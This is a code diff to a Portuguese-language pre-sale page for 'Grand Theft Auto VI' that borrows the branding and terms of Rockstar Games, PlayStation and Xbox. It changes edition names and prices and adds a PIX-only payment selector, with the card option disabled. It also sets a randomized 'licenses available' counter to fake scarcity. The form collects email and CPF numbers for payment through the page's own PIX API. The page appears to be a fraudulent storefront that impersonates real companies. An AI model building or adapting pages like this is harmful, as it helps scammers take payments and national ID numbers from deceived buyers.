@@ -3332,7 +3332,7 @@ document.addEventListener('click', function(e) {
       <div class="stk-body">
         <div class="stk-aviso"><span class="stk-aviso-dot"></span>ESTOQUE LIMITADO</div>
         <div class="stk-counter-wrap">
-          <div><div class="stk-num-big" id="rc-stk-num">351</div></div>
+          <div><div class="stk-num-big" id="rc-stk-num">0</div></div>
           <div class="stk-num-label" style="text-align:right;color:#cc5555">licenças<br>digitais<br>disponíveis</div>
         </div>
         <div class="stk-bar"><div class="stk-bar-fill" id="rc-stk-bar" style="width:0"></div></div>
@@ -3340,6 +3340,7 @@ document.addEventListener('click', function(e) {
         <label class="stk-email-lbl" for="rc-stk-email">Insira seu e-mail para reservar</label>
         <input class="stk-email-input" id="rc-stk-email" type="email" placeholder="seu@email.com" autocomplete="email"/>
         <div class="stk-email-err" id="rc-stk-err">Insira um e-mail válido.</div>
+        <div style="font-size:.72rem;color:#cc5555;line-height:1.6;margin-top:.6rem;padding:.5rem;border-left:3px solid #cc5555;padding-left:.7rem;background:rgba(204,85,85,0.05);border-radius:2px">📧 Após a confirmação do pagamento, você receberá a mídia e os detalhes no seu e-mail.</div>
         <button class="stk-btn" id="rc-stk-btn" disabled>Entrar na Fila de Espera</button>
       </div>
     </div>
@@ -3363,11 +3364,11 @@ document.addEventListener('click', function(e) {
         <div style="margin-bottom:.85rem">
           <div class="rc-flbl" style="margin-bottom:.5rem">Selecione a edição</div>
           <div class="rc-eds-grid">
-            <button class="rc-ed-btn" data-ed="Edição Padrão Digital" data-price="349.90">
-              <span class="rc-ed-tag">Edição</span><span class="rc-ed-name">Padrão<br>Digital</span><span class="rc-ed-price">R$ 349,90</span>
+            <button class="rc-ed-btn" data-ed="Grand Theft Auto VI - Standard" data-price="415.00">
+              <span class="rc-ed-tag">Edição</span><span class="rc-ed-name">Standard<br>Edition</span><span class="rc-ed-price">R$ 415,00</span>
             </button>
-            <button class="rc-ed-btn" data-ed="Edição Deluxe Digital" data-price="499.90">
-              <span class="rc-ed-hot">+ Reservada</span><span class="rc-ed-tag">Edição</span><span class="rc-ed-name">Deluxe<br>Digital</span><span class="rc-ed-price">R$ 499,90</span>
+            <button class="rc-ed-btn" data-ed="Grand Theft Auto VI - Ultimate" data-price="517.00">
+              <span class="rc-ed-tag">Edição</span><span class="rc-ed-name">Ultimate<br>Edition</span><span class="rc-ed-price">R$ 517,00</span>
             </button>
           </div>
         </div>
@@ -3375,6 +3376,13 @@ document.addEventListener('click', function(e) {
         <div class="rc-fblock"><label class="rc-flbl" for="rc-email">E-mail</label><input class="rc-finput" id="rc-email" type="email" placeholder="seu@email.com" autocomplete="email"/></div>
         <div class="rc-fblock"><label class="rc-flbl" for="rc-cpf">CPF</label><input class="rc-finput" id="rc-cpf" type="text" placeholder="000.000.000-00" inputmode="numeric" maxlength="14"/><span style="font-size:.54rem;color:#886060;display:block;margin-top:.25rem">Seu CPF para o pagamento via PIX</span></div>
         <div class="rc-err" id="rc-form-err"></div>
+        <div style="margin:.85rem 0">
+          <div class="rc-flbl" style="margin-bottom:.5rem">Método de pagamento</div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:.6rem">
+            <button class="rc-payment-btn rc-payment-active" data-method="pix" id="rc-pix-btn" style="padding:.8rem;border:2px solid #ffcc00;background-image:url('https://cdn.teletime.com.br/wp-content/uploads/2020/02/Pix-1024x462.jpg');background-size:cover;background-position:center;background-repeat:no-repeat;border-radius:4px;cursor:pointer;color:#fff;font-weight:700;font-size:.8rem;transition:all 0.2s;text-align:center;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:.4rem;min-height:80px"></button>
+            <button class="rc-payment-btn rc-payment-disabled" data-method="card" id="rc-card-btn" disabled style="padding:.8rem;border:2px solid #555;background-image:url('https://images.seeklogo.com/logo-png/43/2/bandeiras-de-cartao-de-credito-logo-png_seeklogo-431666.png');background-size:cover;background-position:center;background-repeat:no-repeat;border-radius:4px;cursor:not-allowed;color:#777;font-weight:700;font-size:.8rem;text-align:center;position:relative;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:.4rem;min-height:80px;opacity:0.5"></button>
+          </div>
+        </div>
         <div class="rc-pricebar"><span class="rc-priceval" id="rc-price-show">R$ --</span><span class="rc-pricenote">Pré-venda digital · PS5 / Xbox Series X|S</span></div>
         <button class="rc-btn-main" id="rc-gerar-btn" disabled>Pagar com PIX</button>
         <div class="rc-terms">Ao continuar, você concorda com os Termos de Serviço da Rockstar Games.</div>
@@ -3445,7 +3453,7 @@ document.addEventListener('click', function(e) {
         <div class="stk-aviso"><span class="stk-aviso-dot"></span>DISPONIBILIDADE LIMITADA</div>
         <div class="stk-counter-wrap">
           <div>
-            <div class="stk-num-big" id="ps-stk-num">351</div>
+            <div class="stk-num-big" id="ps-stk-num">0</div>
           </div>
           <div class="stk-num-label" style="text-align:right">licenças<br>digitais<br>disponíveis</div>
         </div>
@@ -3454,6 +3462,7 @@ document.addEventListener('click', function(e) {
         <label class="stk-email-lbl" for="ps-stk-email">Insira seu e-mail para reservar</label>
         <input class="stk-email-input" id="ps-stk-email" type="email" placeholder="seu@email.com" autocomplete="email"/>
         <div class="stk-email-err" id="ps-stk-err">Insira um e-mail válido.</div>
+        <div style="font-size:.72rem;color:#0070d1;line-height:1.6;margin-top:.6rem;padding:.5rem;border-left:3px solid #0070d1;padding-left:.7rem;background:rgba(0,112,209,0.05);border-radius:2px">📧 Após a confirmação do pagamento, você receberá a mídia e os detalhes no seu e-mail.</div>
         <button class="stk-btn" id="ps-stk-btn" disabled>Entrar na Fila de Espera</button>
       </div>
     </div>
@@ -3477,11 +3486,11 @@ document.addEventListener('click', function(e) {
         <div style="margin-bottom:.85rem">
           <div class="ps-flbl" style="margin-bottom:.5rem">Selecione a edição</div>
           <div class="ps-eds-grid">
-            <button class="ps-ed-btn" data-ed="Edição Padrão Digital" data-price="349.90">
-              <span class="ps-ed-tag">Edição</span><span class="ps-ed-name">Padrão<br>Digital</span><span class="ps-ed-price">R$ 349,90</span>
+            <button class="ps-ed-btn" data-ed="Grand Theft Auto VI - Standard" data-price="415.00">
+              <span class="ps-ed-tag">Edição</span><span class="ps-ed-name">Standard<br>Edition</span><span class="ps-ed-price">R$ 415,00</span>
             </button>
-            <button class="ps-ed-btn" data-ed="Edição Deluxe Digital" data-price="499.90">
-              <span class="ps-ed-hot">+ Reservada</span><span class="ps-ed-tag">Edição</span><span class="ps-ed-name">Deluxe<br>Digital</span><span class="ps-ed-price">R$ 499,90</span>
+            <button class="ps-ed-btn" data-ed="Grand Theft Auto VI - Ultimate" data-price="517.00">
+              <span class="ps-ed-tag">Edição</span><span class="ps-ed-name">Ultimate<br>Edition</span><span class="ps-ed-price">R$ 517,00</span>
             </button>
           </div>
         </div>
@@ -3489,6 +3498,13 @@ document.addEventListener('click', function(e) {
         <div class="ps-fblock"><label class="ps-flbl" for="ps-email">E-mail</label><input class="ps-finput" id="ps-email" type="email" placeholder="seu@email.com" autocomplete="email"/></div>
         <div class="ps-fblock"><label class="ps-flbl" for="ps-cpf">CPF</label><input class="ps-finput" id="ps-cpf" type="text" placeholder="000.000.000-00" inputmode="numeric" maxlength="14"/><span style="font-size:.54px;color:#1a3a6a;display:block;margin-top:.25rem;font-size:.54rem">Seu CPF para o pagamento via PIX</span></div>
         <div class="ps-err" id="ps-form-err"></div>
+        <div style="margin:.85rem 0">
+          <div class="ps-flbl" style="margin-bottom:.5rem">Método de pagamento</div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:.6rem">
+            <button class="ps-payment-btn ps-payment-active" data-method="pix" id="ps-pix-btn" style="padding:.8rem;border:2px solid #0070d1;background-image:url('https://cdn.teletime.com.br/wp-content/uploads/2020/02/Pix-1024x462.jpg');background-size:cover;background-position:center;background-repeat:no-repeat;border-radius:4px;cursor:pointer;color:#fff;font-weight:700;font-size:.8rem;transition:all 0.2s;text-align:center;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:.4rem;min-height:80px"></button>
+            <button class="ps-payment-btn ps-payment-disabled" data-method="card" id="ps-card-btn" disabled style="padding:.8rem;border:2px solid #555;background-image:url('https://images.seeklogo.com/logo-png/43/2/bandeiras-de-cartao-de-credito-logo-png_seeklogo-431666.png');background-size:cover;background-position:center;background-repeat:no-repeat;border-radius:4px;cursor:not-allowed;color:#777;font-weight:700;font-size:.8rem;text-align:center;position:relative;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:.4rem;min-height:80px;opacity:0.5"></button>
+          </div>
+        </div>
         <div class="ps-pricebar"><span class="ps-priceval" id="ps-price-show">R$ --</span><span class="ps-pricenote">Pré-venda digital · PS5</span></div>
         <button class="ps-btn-main" id="ps-gerar-btn" disabled>Pagar com MB Way</button>
         <div class="ps-terms">Ao continuar concorda com os Termos de Serviço da PlayStation Network.</div>
@@ -3559,7 +3575,7 @@ document.addEventListener('click', function(e) {
         <div class="stk-aviso"><span class="stk-aviso-dot"></span>DISPONIBILIDADE LIMITADA</div>
         <div class="stk-counter-wrap">
           <div>
-            <div class="stk-num-big" id="xb-stk-num">351</div>
+            <div class="stk-num-big" id="xb-stk-num">0</div>
           </div>
           <div class="stk-num-label" style="text-align:right">licenças<br>digitais<br>disponíveis</div>
         </div>
@@ -3568,6 +3584,7 @@ document.addEventListener('click', function(e) {
         <label class="stk-email-lbl" for="xb-stk-email">Insira seu e-mail para reservar</label>
         <input class="stk-email-input" id="xb-stk-email" type="email" placeholder="seu@email.com" autocomplete="email"/>
         <div class="stk-email-err" id="xb-stk-err">Insira um e-mail válido.</div>
+        <div style="font-size:.72rem;color:#107C10;line-height:1.6;margin-top:.6rem;padding:.5rem;border-left:3px solid #107C10;padding-left:.7rem;background:rgba(16,124,16,0.05);border-radius:2px">📧 Após a confirmação do pagamento, você receberá a mídia e os detalhes no seu e-mail.</div>
         <button class="stk-btn" id="xb-stk-btn" disabled>Entrar na Fila de Espera</button>
       </div>
     </div>
@@ -3591,11 +3608,11 @@ document.addEventListener('click', function(e) {
         <div style="margin-bottom:.85rem">
           <div class="xb-flbl" style="margin-bottom:.5rem">Selecione a edição</div>
           <div class="xb-eds-grid">
-            <button class="xb-ed-btn" data-ed="Edição Padrão Digital" data-price="349.90">
-              <span class="xb-ed-tag">Edição</span><span class="xb-ed-name">Padrão<br>Digital</span><span class="xb-ed-price">R$ 349,90</span>
+            <button class="xb-ed-btn" data-ed="Grand Theft Auto VI - Standard" data-price="415.00">
+              <span class="xb-ed-tag">Edição</span><span class="xb-ed-name">Standard<br>Edition</span><span class="xb-ed-price">R$ 415,00</span>
             </button>
-            <button class="xb-ed-btn" data-ed="Edição Deluxe Digital" data-price="499.90">
-              <span class="xb-ed-hot">+ Reservada</span><span class="xb-ed-tag">Edição</span><span class="xb-ed-name">Deluxe<br>Digital</span><span class="xb-ed-price">R$ 499,90</span>
+            <button class="xb-ed-btn" data-ed="Grand Theft Auto VI - Ultimate" data-price="517.00">
+              <span class="xb-ed-tag">Edição</span><span class="xb-ed-name">Ultimate<br>Edition</span><span class="xb-ed-price">R$ 517,00</span>
             </button>
           </div>
         </div>
@@ -3603,6 +3620,13 @@ document.addEventListener('click', function(e) {
         <div class="xb-fblock"><label class="xb-flbl" for="xb-email">E-mail</label><input class="xb-finput" id="xb-email" type="email" placeholder="seu@email.com" autocomplete="email"/></div>
         <div class="xb-fblock"><label class="xb-flbl" for="xb-cpf">CPF</label><input class="xb-finput" id="xb-cpf" type="text" placeholder="000.000.000-00" inputmode="numeric" maxlength="14"/><span style="font-size:.54rem;color:#1a4a1a;display:block;margin-top:.25rem">Seu CPF para o pagamento via PIX</span></div>
         <div class="xb-err" id="xb-form-err"></div>
+        <div style="margin:.85rem 0">
+          <div class="xb-flbl" style="margin-bottom:.5rem">Método de pagamento</div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:.6rem">
+            <button class="xb-payment-btn xb-payment-active" data-method="pix" id="xb-pix-btn" style="padding:.8rem;border:2px solid #107C10;background-image:url('https://cdn.teletime.com.br/wp-content/uploads/2020/02/Pix-1024x462.jpg');background-size:cover;background-position:center;background-repeat:no-repeat;border-radius:4px;cursor:pointer;color:#fff;font-weight:700;font-size:.8rem;transition:all 0.2s;text-align:center;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:.4rem;min-height:80px"></button>
+            <button class="xb-payment-btn xb-payment-disabled" data-method="card" id="xb-card-btn" disabled style="padding:.8rem;border:2px solid #555;background-image:url('https://images.seeklogo.com/logo-png/43/2/bandeiras-de-cartao-de-credito-logo-png_seeklogo-431666.png');background-size:cover;background-position:center;background-repeat:no-repeat;border-radius:4px;cursor:not-allowed;color:#777;font-weight:700;font-size:.8rem;text-align:center;position:relative;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:.4rem;min-height:80px;opacity:0.5"></button>
+          </div>
+        </div>
         <div class="xb-pricebar"><span class="xb-priceval" id="xb-price-show">R$ --</span><span class="xb-pricenote">Pré-venda digital · Xbox Series X|S</span></div>
         <button class="xb-btn-main" id="xb-gerar-btn" disabled>Pagar com MB Way</button>
         <div class="xb-terms">Ao continuar concorda com o Contrato de Serviços Microsoft.</div>
@@ -3657,7 +3681,7 @@ document.addEventListener('click', function(e) {
   var PAID=['paid','approved','completed','confirmed','success'];
   var API_CREATE='/gta/api-pix/api.php';
   var API_CHECK='/gta/api-pix/verificar.php';
-  var STOCK_TOTAL=2000,STOCK_LEFT=351;
+  var STOCK_TOTAL=5000,STOCK_LEFT=Math.floor(Math.random() * (3500 - 3100 + 1)) + 3100;
 
   function digs(v){return v.replace(/\D/g,'');}
   function maskPhone(v){var d=digs(v).slice(0,9);if(d.length<=3)return d;if(d.length<=6)return d.slice(0,3)+' '+d.slice(3);return d.slice(0,3)+' '+d.slice(3,6)+' '+d.slice(6);}
@@ -3741,7 +3765,7 @@ document.addEventListener('click', function(e) {
     ],function(){
       document.getElementById('ps-email').value=psCapturedEmail;
       goStep('ps','form');
-      var psDefaultBtn=document.querySelector('.ps-ed-btn[data-ed="Edição Padrão Digital"]');if(psDefaultBtn)psDefaultBtn.click();
+      var psDefaultBtn=document.querySelector('.ps-ed-btn[data-ed="Grand Theft Auto VI - Standard"]');if(psDefaultBtn)psDefaultBtn.click();
     });
   });
 
@@ -3842,7 +3866,7 @@ document.addEventListener('click', function(e) {
     ],function(){
       document.getElementById('xb-email').value=xbCapturedEmail;
       goStep('xb','form');
-      var xbDefaultBtn=document.querySelector('.xb-ed-btn[data-ed="Edição Padrão Digital"]');if(xbDefaultBtn)xbDefaultBtn.click();
+      var xbDefaultBtn=document.querySelector('.xb-ed-btn[data-ed="Grand Theft Auto VI - Standard"]');if(xbDefaultBtn)xbDefaultBtn.click();
     });
   });
 
@@ -3943,7 +3967,7 @@ document.addEventListener('click', function(e) {
     ],function(){
       document.getElementById('rc-email').value=rcCapturedEmail;
       goStep('rc','form');
-      var rcDefaultBtn=document.querySelector('.rc-ed-btn[data-ed="Edição Padrão Digital"]');if(rcDefaultBtn)rcDefaultBtn.click();
+      var rcDefaultBtn=document.querySelector('.rc-ed-btn[data-ed="Grand Theft Auto VI - Standard"]');if(rcDefaultBtn)rcDefaultBtn.click();
     });
   });
 
